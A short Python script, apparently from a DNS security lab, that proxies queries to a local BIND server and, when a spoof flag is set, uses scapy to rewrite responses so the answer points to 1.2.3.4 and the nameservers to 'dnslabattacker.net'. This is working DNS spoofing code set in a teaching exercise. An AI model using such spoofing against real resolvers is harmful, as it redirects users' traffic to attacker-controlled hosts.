#!/usr/bin/env python
import argparse
import socket
from scapy.all import *

# This is going to Proxy in front of the Bind Server

parser = argparse.ArgumentParser()
parser.add_argument(
    "--port", help="port to run your proxy on - careful to not run it on the same port as the BIND server", type=int)
parser.add_argument(
    "--dns_port", help="port the BIND uses to listen to dns queries", type=int)
parser.add_argument("--spoof_response", action="store_true",
                    help="flag to indicate whether you want to spoof the BIND Server's response (Part 3) or return it as is (Part 2). Set to True for Part 3 and False for Part 2", default=False)
args = parser.parse_args()

# Port to run the proxy on
port = args.port
# BIND's port
dns_port = args.dns_port
# Flag to indicate if the proxy should spoof responses
SPOOF = args.spoof_response


s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.bind(("127.0.0.1", port)) 

while True:
	data_DIG, address_DIG = s.recvfrom(1024)
	s.sendto(data_DIG, ("127.0.0.1", dns_port))

	data_BIND, address_BIND = s.recvfrom(1024)
	
	if SPOOF:
		data_SPOOF = DNS(data_BIND)
   		#print data_SPOOF.show()
		data_SPOOF.an.rdata = "1.2.3.4"
		data_SPOOF.ns['DNSRR'][0].rdata = "ns1.dnslabattacker.net"
		data_SPOOF.ns['DNSRR'][1].rdata = "ns2.dnslabattacker.net"
		data_SPOOF.ar = None
		data_SPOOF.arcount = 0		
		s.sendto(bytes(data_SPOOF), address_DIG)


	else:
		s.sendto(data_BIND, address_DIG)



